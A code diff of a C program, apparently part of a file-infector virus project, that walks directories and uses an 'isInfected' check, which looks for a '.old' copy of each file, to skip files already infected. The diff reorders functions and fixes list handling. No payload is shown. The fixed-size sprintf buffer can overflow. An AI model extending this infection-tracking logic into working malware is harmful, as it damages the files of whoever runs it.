@@ -22,26 +22,6 @@ struct List
     Element *p;
 };
 
-bool isInfected(char* file, List *liste)
-{
-    if (liste == NULL)
-    {
-        return false;
-    }
-    char cible[200];
-    sprintf(cible,"%s.old",file);
-    Element *actuel = liste->p;
-    while (actuel != NULL)
-    {
-        if (strcmp(cible, actuel->fichier) == 0)
-        {
-            return true;
-        }
-        actuel = actuel->prev;
-    }
-    return false;
-}
-
 void printList(List *liste)
 {
     if (liste == NULL)
@@ -118,6 +98,26 @@ bool    deleteItem(List *list, Element *deleteItem) {
     return true;
 }
 
+bool isInfected(char* file, List *liste)
+{
+    if (liste == NULL)
+    {
+        return false;
+    }
+    char cible[200];
+    sprintf(cible,"%s.old",file);
+    Element *actuel = liste->p;
+    while (actuel != NULL)
+    {
+        if (strcmp(cible, actuel->fichier) == 0)
+        {
+            return true;
+        }
+        actuel = actuel->prev;
+    }
+    return false;
+}
+
 List* recursiveResearch(List* fichiers, List* old, char* PATH, int cibles){
     DIR *dirp;
     struct dirent *entry;
@@ -142,22 +142,28 @@ List* recursiveResearch(List* fichiers, List* old, char* PATH, int cibles){
                 } 
                 else
                 {
-                    insert(old, fichier);
+                    old = insert(old, fichier);
                 }
             }
         }
     }
     
-
    if (fichiers)
     {
         Element *actuel = fichiers->p;
-        while (actuel != NULL)
+        Element *del = NULL;
+        while (actuel)
         {
             if (isInfected(actuel->fichier, old)){
-                deleteItem(fichiers, actuel);
+                printf("TEST A SUPPRIMER : %s\n", actuel->fichier);
+                del = actuel;
+                actuel = actuel->prev;
+                deleteItem(fichiers, del);
             }
-            actuel = actuel->prev;
+            else
+            {
+                actuel = actuel->prev;
+            }
         }
     }
     return fichiers;
@@ -174,7 +180,7 @@ int main(){
     List* cibles = NULL;
     cibles = recursiveResearch(cibles, old, PATH, 0);
 
-    printList(cibles);
+    //printList(cibles);
 
     return EXIT_SUCCESS;
 }
